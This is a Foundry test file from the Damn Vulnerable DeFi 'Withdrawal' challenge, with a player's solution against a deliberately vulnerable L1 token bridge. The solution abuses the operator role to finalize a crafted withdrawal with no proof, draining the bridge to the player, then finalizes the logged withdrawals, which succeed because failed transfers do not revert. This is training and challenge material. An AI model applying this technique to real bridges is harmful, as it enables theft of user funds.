// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

// See https://book.getfoundry.sh/cheatcodes/parse-json
// To understand subtle aspects about decoding data
//
// > As the values are returned as an abi-encoded tuple,
// > the exact name of the attributes of the struct don’t
// > need to match the names of the keys in the JSON.
//
// > What matters is the alphabetical order.
// > As the JSON object is an unordered data structure but
// > the tuple is an ordered one, we had to somehow give order to the JSON.
// > The easiest way was to order the keys by alphabetical order.
// > That means that in order to decode the JSON object correctly,
// > you will need to define attributes of the struct with types that
// > correspond to the values of the alphabetical order of the keys of the JSON.
struct Withdrawal {
    bytes data;
    bytes32[] topics;
}

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        // Read and process the json file.
        string memory path = "/test/withdrawal/withdrawals.json";
        Withdrawal[] memory withdrawals =
            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Withdrawal[]));
        uint8 numberOfWithdrawals = uint8(withdrawals.length);

        uint256[] memory nonces = new uint256[](numberOfWithdrawals);
        address[] memory l2Senders = new address[](numberOfWithdrawals);
        address[] memory targets = new address[](numberOfWithdrawals);
        uint256[] memory timestamps = new uint256[](numberOfWithdrawals);
        bytes[] memory messages = new bytes[](numberOfWithdrawals);
        bytes32[] memory proof = new bytes32[](0);

        uint256 latestTimestamp = 0;

        for (uint8 i = 0 ; i < numberOfWithdrawals; i++) {
            // https://docs.soliditylang.org/en/latest/contracts.html#events
            // > You can add the attribute indexed to up to three parameters which adds
            // > them to a special data structure known as “topics” instead of the data
            // > part of the log. A topic can only hold a single word (32 bytes) so if
            // > you use a reference type for an indexed argument, the Keccak-256 hash
            // > of the value is stored as a topic instead.
            //
            // > All parameters without the indexed attribute are ABI-encoded into the data part of the log.
            nonces[i] = uint256(withdrawals[i].topics[1]);
            l2Senders[i] = address(uint160(uint256(withdrawals[i].topics[2])));
            targets[i] = address(uint160(uint256(withdrawals[i].topics[3])));

            (,timestamps[i], messages[i]) = abi.decode(withdrawals[i].data, (bytes32, uint256, bytes));

            if (timestamps[i] > latestTimestamp) latestTimestamp = timestamps[i];
        }

        // With this information, we now advance the timestamp by 7 days.
        // Next, we will submit a crafted withdrawal request to transfer all the funds to a specified address.
        // Then immediately send the registered withdrawals we previously collected for finalization.
        // These will succeed, as a failure in the transfer from the bridge does not revert the transaction.
        // Lastly, we will return the funds to the bridge.
        vm.warp(latestTimestamp + 7 * 24 * 60 * 60);

        bytes memory tokenBridgeMessage = abi.encodeWithSelector(l1TokenBridge.executeTokenWithdrawal.selector, player, token.balanceOf(address(l1TokenBridge)));
        bytes memory l1ForwarderMessage = abi.encodeWithSelector(l1Forwarder.forwardMessage.selector, uint256(0), address(0), address(l1TokenBridge), tokenBridgeMessage);
        l1Gateway.finalizeWithdrawal(0, l2Handler, address(l1Forwarder), latestTimestamp, l1ForwarderMessage, proof);

        for (uint8 i = 0; i < numberOfWithdrawals; i++) {
            l1Gateway.finalizeWithdrawal(nonces[i], l2Senders[i], targets[i], timestamps[i], messages[i], proof);
        }

        // Challenge conditions want the bridge to have less than the initial amount of tokens.
        // The palyer must hold 0 of these tokens as well.
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT - 1);
        token.transfer(address(0), 1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
